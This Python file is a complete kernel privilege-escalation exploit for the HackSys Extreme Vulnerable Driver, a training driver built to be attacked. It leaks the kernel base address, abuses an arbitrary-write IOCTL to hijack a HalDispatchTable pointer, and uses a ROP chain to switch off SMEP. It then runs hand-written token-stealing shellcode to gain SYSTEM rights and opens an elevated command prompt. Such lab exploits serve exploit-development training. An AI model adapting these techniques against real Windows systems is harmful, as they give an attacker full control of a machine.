import sys
import struct
import subprocess
from ctypes import *

# Constants used in Windows APIs
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
FILE_SHARE_READ = 0x00000001
FILE_SHARE_WRITE = 0x00000002
OPEN_EXISTING = 3
FILE_ATTRIBUTE_NORMAL = 0x00000080
FILE_FLAG_OVERLAPPED = 0x40000000
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40

# HEVD IOCTL code
IOCTL_ARBITRARY_WRITE = 0x22200b

# ROP related
g_stack_pivot = 0x00000000003e92b9       # mov esp, ebx; ret;
g_mov_cr4_rcx_addr = 0x000000000039df47  # mov cr4, rcx; ret;
g_pop_rcx_addr = 0x0000000000205dbc      # pop rcx; ret
cr4_smep_disabled = 0x2506f8             # CR4 register value for disabled SMEP


# Get a handle to the HEVD device driver
def get_device_handle():
    handle = windll.kernel32.CreateFileA(
        b'\\\\.\\HackSysExtremeVulnerableDriver', 
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        None
    )

    return handle


# Leak the kernel base address using EnumDeviceDrivers API
def get_kernel_base():
    drivers = (c_ulonglong * 2048)()
    bytes_returned = (c_long)()

    windll.Psapi.EnumDeviceDrivers(byref(drivers), sizeof(drivers), byref(bytes_returned))

    return drivers[0]


# Load ntoskrnl.exe in the context of our process using LoadLibrary
# Then, use GetProcAddress to get the address to some exported symbol
# Use the leaked kernel base address to calculate the address of the symbol in the running kernel
def get_kernel_symbol_addr(symbol: bytes):
    kernel_base = get_kernel_base()

    windll.kernel32.LoadLibraryA.restype = c_void_p
    handle = windll.kernel32.LoadLibraryA(b'C:\\Windows\\System32\\ntoskrnl.exe')

    if handle == -1:
        print('Failed to load ntoskrnl.exe')
        return -1

    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    addr = windll.kernel32.GetProcAddress(handle, symbol)

    return (addr - handle) + kernel_base


# Interact with the device driver using IOCTL_ARBITRARY_WRITE
def do_ioctl(handle, buffer_ptr):
    bytes_returned = c_ulong()
    buffer_len = 16

    windll.kernel32.DeviceIoControl(
        handle,
        IOCTL_ARBITRARY_WRITE,
        buffer_ptr,
        buffer_len,
        None,
        0,
        byref(bytes_returned),
        None)


def initialize_globals():
    global g_stack_pivot, g_mov_cr4_rcx_addr, g_pop_rcx_addr

    print('Initializing globals...')
    
    kernel_base = get_kernel_base()
    print('kernel_base = 0x%x' %(kernel_base))

    g_stack_pivot += kernel_base
    print('g_stack_pivot = 0x%x' %(g_stack_pivot))

    g_mov_cr4_rcx_addr += kernel_base
    print('g_mov_cr4_rcx_addr = 0x%x' %(g_mov_cr4_rcx_addr))

    g_pop_rcx_addr += kernel_base
    print('g_pop_rcx_addr = 0x%x' %(g_pop_rcx_addr))


def get_fake_stack_addr():
    FAKE_STACK_SIZE = 0xD000

    shellcode = bytearray(
        b"\x65\x48\x8b\x04\x25\x88\x01"      # mov    rax,QWORD PTR gs:0x188
        b"\x00\x00"
        b"\x48\x8b\x80\xb8\x00\x00\x00"      # mov    rax,QWORD PTR [rax+0xb8]
        b"\x48\x89\xc3"                      # mov    rbx,rax
        b"\x48\x8b\x9b\x48\x04\x00\x00"      # mov    rbx,QWORD PTR [rbx+0x448]
        b"\x48\x81\xeb\x48\x04\x00\x00"      # sub    rbx,0x448
        b"\x48\x8b\x8b\x40\x04\x00\x00"      # mov    rcx,QWORD PTR [rbx+0x440]
        b"\x48\x83\xf9\x04"                  # cmp    rcx,0x4
        b"\x75\xe5"                          # jne    13 <_loop>
        b"\x48\x8b\x8b\xb8\x04\x00\x00"      # mov    rcx,QWORD PTR [rbx+0x4b8]
        b"\x80\xe1\xf0"                      # and    cl,0xf0
        b"\x48\x89\x88\xb8\x04\x00\x00"      # mov    QWORD PTR [rax+0x4b8],rcx
        b"\x48\x89\xec"                      # mov    rsp,rbp
        b"\x48\x81\xec\x18\x01\x00\x00"      # sub    rsp,0x118
        b"\x48\x31\xc0"                      # xor    rax,rax
        b"\xc3"                              # ret
    )

    windll.kernel32.VirtualAlloc.restype = c_void_p
    shellcode_buff = windll.kernel32.VirtualAlloc(0, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)

    if shellcode_buff == 0:
        printf('Failed to allocate buffer for shellcode')
        return -1

    tmp_c_buffer = (c_char * len(shellcode)).from_buffer(shellcode)

    windll.kernel32.RtlMoveMemory.argtypes = [c_void_p, c_void_p, c_ulong]
    windll.kernel32.RtlMoveMemory(shellcode_buff, tmp_c_buffer, len(shellcode))

    fake_stack = bytearray(struct.pack('<Q', g_pop_rcx_addr))
    fake_stack += struct.pack('<Q', cr4_smep_disabled)
    fake_stack += struct.pack('<Q', g_mov_cr4_rcx_addr)
    fake_stack += struct.pack('<Q', shellcode_buff)

    buffer = windll.kernel32.VirtualAlloc(0x00ffffff, FAKE_STACK_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    
    if buffer == 0:
        print('Failed to allocate fake stack buffer')
        return -1

    # The fake stack will be actually in the middle of the big chunk we allocated
    fake_stack_ptr = buffer + int(FAKE_STACK_SIZE / 2)

    if fake_stack_ptr > 0xffffffff:
        print('Fake stack pointer is larger than 2^32')
        return -1

    # The following lines will just move the values in the fake_stack variable to the actual fake stack we allocated with VirtualAlloc
    tmp_c_buffer = (c_char * len(fake_stack)).from_buffer(fake_stack)
    windll.kernel32.RtlMoveMemory(fake_stack_ptr, tmp_c_buffer, len(fake_stack))

    return fake_stack_ptr


# Exploit the vulnerability to read from arbitrary addresses
def read(where: int):
    device_handle = get_device_handle()

    if device_handle == -1:
        print('Error while getting handle to driver: {0}'.format(GetLastError()))
        return 1
    
    class WRITE_WHAT_WHERE(Structure):
        _fields_ = [
            ('What', c_ulonglong),
            ('Where', c_ulonglong)
        ]

    www = WRITE_WHAT_WHERE()
    tmp = c_ulonglong()
    www.What = c_ulonglong(where)
    www.Where = addressof(tmp)

    do_ioctl(device_handle, pointer(www))
    windll.kernel32.CloseHandle(device_handle)

    return tmp.value


# Exploit the vulnerability to write into arbitrary addresses
def write(what: int, where: int):
    device_handle = get_device_handle()

    if device_handle == -1:
        print('Error while getting handle to driver: {0}'.format(GetLastError()))
        return 1
    
    class WRITE_WHAT_WHERE(Structure):
        _fields_ = [
            ('What', c_ulonglong),
            ('Where', c_ulonglong)
        ]

    www = WRITE_WHAT_WHERE()
    tmp = c_ulonglong(what)
    www.What = addressof(tmp)
    www.Where = c_ulonglong(where)

    do_ioctl(device_handle, pointer(www))
    windll.kernel32.CloseHandle(device_handle)


def main():
    initialize_globals()
    device_handle = get_device_handle()

    if device_handle == -1:
        print('Error while getting handle to driver: {0}'.format(GetLastError()))
        return 1

    hal_dispatch_table_addr = get_kernel_symbol_addr(b'HalDispatchTable')

    if hal_dispatch_table_addr in [0, -1]:
        print('Error while getting address to HalDispatchTable')
        return 1
    
    backup_function_pointer = read(hal_dispatch_table_addr + 0x8)
    fake_stack_ptr = get_fake_stack_addr()
    write(g_stack_pivot, hal_dispatch_table_addr + 0x8)
    windll.ntdll.NtQueryIntervalProfile(0x1234, fake_stack_ptr)
    write(backup_function_pointer, hal_dispatch_table_addr + 0x8)

    subprocess.Popen('start cmd', shell=True)
    return 0

if __name__ == '__main__':
    ret = main()
    sys.exit(ret)
